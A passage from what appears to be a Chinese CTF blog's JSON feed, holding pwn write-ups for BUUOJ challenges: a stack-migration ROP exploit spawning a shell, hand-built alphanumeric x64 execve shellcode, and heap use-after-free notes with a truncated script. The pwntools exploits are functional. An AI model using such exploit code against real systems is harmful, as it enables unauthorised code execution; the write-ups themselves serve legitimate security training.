class=\"markdownIt-Anchor\" href=\"#stack-migration\">#</a> stack migration</h2>\n<p>栈迁移<br>\n经典题，溢出只能到返回地址。<br>\n这道题给了 buf 局部变量的地址，因此可以把栈迁移到 buf 的位置。在字符串开头构建 payload，后半部分放入 buf 地址和 leave_ret 地址。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25141</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./pwn')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b puts')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>read_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>puts_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>main_a <span class=\"token operator\">=</span> <span class=\"token number\">0x4012be</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>prdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0401333</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x401331</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x050</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>leave_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4012aa</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift for you: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> offset</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'plz:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'soon!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#p.close()</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>libc = LibcSearcher('__libc_start_main',lsm_a)</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>libcbase = lsm_a - libc.dump('__libc_start_main')</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>sys_a = libcbase + libc.dump('system')</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>bs_a = libcbase + libc.dump('str_bin_sh')</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\">#'''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift for you: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> offset</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"shellcode_revenge\"><a class=\"markdownIt-Anchor\" href=\"#shellcode_revenge\">#</a> **shellcode_revenge</h2>\n<p>alphanumeric shellcode x64 uppercase<br>\n 这道题是仅包含大小写和数字类型的 shellcode。仅仅利用这些范围里的机器码构建 shellcode。<br>\n大家的解法都是用工具。大致有一下三种。</p>\n<ul>\n<li>ae64: 用于 x64，需大小写及数字</li>\n<li>alpha3,  x64 模式 需大小写及数字 x86 可选择仅小写和数字 或 大写和数字</li>\n<li>metasploit 中的 msfvenom， 同 alpha3</li>\n</ul>\n<p>但是这题是 64 位题，并且只能用大写和数字编写 shellcode，因此以上工具均用不了，只能自己编写 shellcode。（也或者单纯我没找到这种工具）<br>\n构造 shellcode 大部分情况就是构造 <code>execve(&quot;/bin/sh&quot;,0,0);</code>  这一系统调用，因此以下数据必不可少。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>“/bin”-&gt;rdi</th>\n<th>“/sh\\0”</th>\n<th>syscall 机器码</th>\n<th>execve 调用号 - rax</th>\n<th>rsi</th>\n<th>rdx</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>编码</td>\n<td>\\x2f\\x62\\x69\\x6e</td>\n<td>\\x2f\\x7c\\x68\\x00</td>\n<td>\\x0f\\x05</td>\n<td>\\x3b</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>16 进制</td>\n<td>0x6e69622f</td>\n<td>0x68732f</td>\n<td>0x50f</td>\n<td>0x3b</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>xor</td>\n<td>31 30 30 36</td>\n<td>31 30 30 5a</td>\n<td>41 30</td>\n<td>39</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>xor</td>\n<td>48 52 59 58</td>\n<td>48 53 58 5a</td>\n<td>4e 35</td>\n<td>32</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>41</td>\n<td>41</td>\n<td></td>\n<td>30</td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>数字的 ascii 码范围是 <code>0x30~0x39</code> ，大写字母的 ascii 码范围是 <code>0x41~0x5a</code> 。</p>\n</blockquote>\n<p>上述数据所对应的字符都不属于大写字母和数字，因此无法直接构建 shellcode。所以可以利用数字范围的部分 xor，以两个数字异或得到想要的数据。其中部分数据需要 3 个数才能异或获得。如 <code>'/'</code> ，不过因为其恰好位于低位，用 <code>xor al, 41;</code>  可以不影响其他位。<br>\n其次 push 立即数的机器码属于小写字母，所以还是只能通过异或寄存器再 push 寄存器的方式往栈上放入数据。在异或前需先将寄存器清零。这里用将寄存器的值 push 到栈上，寄存器再与栈顶数据异或的方式清零。</p>\n<pre><code>push rdi;\npush rsp;\npop rcx;\nxor rdi, QWORD PTR [rcx];\n</code></pre>\n<p>rdx 和 在刚开始执行 shellcode 时放入了 shellcode 的地址。可以利用其往 shellcode 写入数据，这样就能够异或出 syscall 的机器码接在其他 shellcode 之后。而刚开始我想把 <code>&quot;/bin/sh\\0&quot;</code>  放在栈上，但由于 xor 好像只支持 32 位数据，而寄存器以及 pop 入栈的数据都是 64 位，所以放入栈上的两段字符串无法连接，因此我也将字符串放在了 shellcode 的最后。</p>\n<table>\n<thead>\n<tr>\n<th>P</th>\n<th>0x50</th>\n<th>push %rax</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Q</td>\n<td>0x51</td>\n<td>push %rcx</td>\n</tr>\n<tr>\n<td>R</td>\n<td>0x52</td>\n<td>push %rdx</td>\n</tr>\n<tr>\n<td>S</td>\n<td>0x53</td>\n<td>push %rbx</td>\n</tr>\n<tr>\n<td>T</td>\n<td>0x54</td>\n<td>push %rsp</td>\n</tr>\n<tr>\n<td>U</td>\n<td>0x55</td>\n<td>push %rbp</td>\n</tr>\n<tr>\n<td>V</td>\n<td>0x56</td>\n<td>push %rsi</td>\n</tr>\n<tr>\n<td>W</td>\n<td>0x57</td>\n<td>push %rdi</td>\n</tr>\n<tr>\n<td>X</td>\n<td>0x58</td>\n<td>pop %rax</td>\n</tr>\n<tr>\n<td>Y</td>\n<td>0x59</td>\n<td>pop %rcx</td>\n</tr>\n<tr>\n<td>Z</td>\n<td>0x5a</td>\n<td>pop %rdx</td>\n</tr>\n</tbody>\n</table>\n<p>可以利用的 <code>push</code>  和 <code>pop</code>  仅有上面几种，所以数据操作大部分以 <code>rax``rcx</code>  为中介。利用 <code>xor DWORD PTR [rdx+0x58], eax</code>  及变形对 shellcode 的数据进行操作。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#e=ELF('./shellcodere')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./shellcodere')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26414</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x40136E')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>assem <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>push rdi;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>push rsp;</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pop rcx;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>xor rdi, QWORD PTR [rcx];</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>push rsp;</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>pop rcx;</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>xor esi, DWORD PTR [rcx]</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pop rax;\t</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>xor eax, 0x5a5a354e</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>xor DWORD PTR [rdx+0x4c], eax</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>xor eax, 0x5a303031;</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>xor eax, 0x5a58434f;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>xor al, 0x51;</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>xor DWORD PTR [rdx+0x58], eax</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>push rax;</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>xor eax, 0x36303031;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>xor eax, 0x5859524f;</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>xor al, 0x51;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>xor DWORD PTR [rdx+0x54], eax</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>push rdx;</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>xor al, 0x54;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>push rax;</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>push rsp;</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>pop rcx;</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>xor rdi, QWORD PTR [rcx];</pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>push rsi;</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>pop rdx;</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>push rdx;</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>pop rax;</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>xor al, 0x39</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>xor al, 0x32</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>xor al, 0x30</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>assem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>disasm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'magic'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>shellcode<span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x5a5a3041</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXRzLmVjL1NoZWxsY29kZS9BcHBlbmRpeC9BbHBoYW51bWVyaWNfb3Bjb2Rl\">Alphanumeric opcode</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NtYWxPU25haWwvYXJ0aWNsZS9kZXRhaWxzLzEwNTIzNjMzNg==\"> 这是那篇怎么搜都出现两三遍的文章</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXRzLmVjL0FscGhhbnVtZXJpY19zaGVsbGNvZGU=\"> https://nets.ec/Alphanumeric_shellcode</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODU4NzE=\">https://www.anquanke.com/post/id/85871</span></p>\n",
            "tags": [
                "stack migration",
                "random",
                "shellcode",
                "format string",
                "integer overflow",
                "canary"
            ]
        },
        {
            "id": "http://waltcsz.github.io/2023/09/buu-0910/",
            "url": "http://waltcsz.github.io/2023/09/buu-0910/",
            "title": "buu 0910",
            "date_published": "2023-09-11T09:12:49.000Z",
            "content_html": "<h2 id=\"bjdctf_2020_router\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf_2020_router\">#</a> bjdctf_2020_router</h2>\n<p><img data-src=\"./image-20230911171316327.png\" alt=\"image-20230911171316327\"></p>\n<p>0x7ffd797d1e80 - 0x7ffd797d1fc0 = -320</p>\n<p>tcache 中的地址为与堆基址异或后的地址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNjUxNzA3Nzc=\">从 VNCTF2021-ff 浅析 libc2.32 下 ptmalloc 新增的防护之指针异或加密 - 知乎 (zhihu.com)</span></p>\n<h2 id=\"zjctf-2019-easyheap\"><a class=\"markdownIt-Anchor\" href=\"#zjctf-2019-easyheap\">#</a> zjctf 2019 easyheap</h2>\n<h2 id=\"picoctf_2018_buffer_overflow_1\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_buffer_overflow_1\">#</a> PicoCTF_2018_buffer_overflow_1</h2>\n<p>setegid</p>\n<p>送分</p>\n<h2 id=\"black-watch-入群题\"><a class=\"markdownIt-Anchor\" href=\"#black-watch-入群题\">#</a> black watch 入群题</h2>\n<h2 id=\"inndy_rop\"><a class=\"markdownIt-Anchor\" href=\"#inndy_rop\">#</a> inndy_rop</h2>\n<p>学了个 ROPgadget 的妙招，–ropchain 参数可以自动生成 rop 链，代码都写好了一半。</p>\n<p>其次，找 32 位 elf 的系统调用时，用–only ‘int’</p>\n<h2 id=\"hitcontraining_uaf\"><a class=\"markdownIt-Anchor\" href=\"#hitcontraining_uaf\">#</a> hitcontraining_uaf</h2>\n<p>Use after free</p>\n<p>（与 ctfwiki 的 [例题](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91c2UtYWZ0ZXItZnJlZS8=\">Use After Free - CTF Wiki (ctf-wiki.org)</span>) 一致）</p>\n<p>这道题经典菜单，add，print，delete 三个选项。</p>\n<p>在 add 中，程序会进行两次 malloc，第一次 malloc 一个 8 字节的空间，存放一个打印函数的地址和第二次 malloc 的地址，以下称为头块。第二次 malloc 为实际存放内容的堆块，以下称为真实块。</p>\n<p>在 print 中，利用头块前 4 字节的打印函数的地址将真实块进行输出。</p>\n<p>在 delete 中，free 完没有清空指针，而且 add 中分配的两个堆块均会被释放。</p>\n<p>其次，notelist 上限为 5，释放堆块后不会清指针，因此只允许分配 5 次堆块。</p>\n<p>存在后门函数 magic。</p>\n<p>这题没有编辑函数，虽然有指针可以对释放后的堆块进行输出和再次释放，但不能修改。所以我原先的思路，即利用编辑函数修改 bk 指向头块输出函数地址位置，将堆块分配到其处再修改地址的方案失效。</p>\n<p>因此这题利用关键是每次同时分配和释放的两个堆块。倘若某次申请的内存大小为 8 字节，那么分配的两个堆块大小一样，便会从同一个 bin 中取出，即 0x10 的 bin。而释放时头块进入的即是 0x10 的 bin。这样我们的真实块必然会分配到已经释放的一个头块上，对其写入 magic，调用 print 对对应的堆块输出，即可跳转到后门函数。</p>\n<ul>\n<li>申请 note0，真实块 size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>\n<li>申请 note1，真实块 size 为 16（同上）</li>\n<li>释放 note0</li>\n<li>释放 note1</li>\n<li>此时，0x20 的 fastbin chunk 中链表为 note1-&gt;note0, 0x10 的 fastbin chunk 中链表为 note1_head -&gt; note0_head</li>\n<li>申请 note2，并且设置真实块 content 的大小为 8，那么根据堆的分配规则</li>\n<li>note2_head 其实会分配 note1_head。</li>\n<li>note2 对应的 chunk 其实是 note0_head。</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28447</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./hacknote')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span 